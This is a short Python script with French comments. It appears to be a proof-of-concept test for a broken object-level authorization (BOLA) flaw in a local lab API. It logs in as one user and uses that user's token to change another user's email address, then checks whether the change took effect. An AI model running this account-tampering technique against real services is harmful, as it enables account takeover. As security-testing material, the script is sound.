import httpx

BASE = "http://localhost:5002"

def montrer(titre, reponse):
    """Affiche le détail complet d'une réponse."""
    print(f"\n{'='*55}")
    print(f"  {titre}")
    print(f"{'='*55}")
    print(f"  Code de statut : {reponse.status_code}")
    print(f"  En-têtes       : {dict(reponse.headers)}")
    print(f"  Corps          : {reponse.text}")


# ── Étape 1 : connexion de l'attaquant ───────────────────────────────
login = httpx.post(f"{BASE}/users/v1/login",
                   json={"username": "name2", "password": "pass2"})
montrer("ETAPE 1 — Connexion de l'attaquant (name1)", login)

# On vérifie que le login a réussi AVANT de continuer
if login.status_code != 200 or "auth_token" not in login.json():
    print("\n[!] Login échoué — impossible de continuer. Vérifie les identifiants.")
    exit()

token = login.json()["auth_token"]
print(f"\n  Token récupéré : {token[:40]}...")


# ── Étape 2 : état de la victime AVANT l'attaque ─────────────────────
avant = httpx.get(f"{BASE}/users/v1/name1")
montrer("ETAPE 2 — Etat de name1 AVANT l'attaque", avant)


# ── Étape 3 : l'attaque (name2 modifie l'email de name1) ─────────────
attaque = httpx.put(f"{BASE}/users/v1/name1/email",
                    json={"email": "yassine@yassine.com"},
                    headers={"Authorization": f"Bearer {token}"})
montrer("ETAPE 3 — Attaque : name2 modifie l'email de name1", attaque)


# ── Étape 4 : état de la victime APRÈS l'attaque ─────────────────────
apres = httpx.get(f"{BASE}/users/v1/name1")
montrer("ETAPE 4 — Etat de name1 APRES l'attaque", apres)


# ── Verdict automatique ──────────────────────────────────────────────
print(f"\n{'='*55}")
print("  VERDICT")
print(f"{'='*55}")
email_avant = avant.json().get("email")
email_apres = apres.json().get("email")
print(f"  Email avant : {email_avant}")
print(f"  Email après : {email_apres}")

if email_avant != email_apres:
    print("  >>> L'EMAIL A CHANGÉ → BOLA RÉEL (l'attaque a eu un effet)")
else:
    print("  >>> L'email est identique → PAS de BOLA (204 sans effet réel)")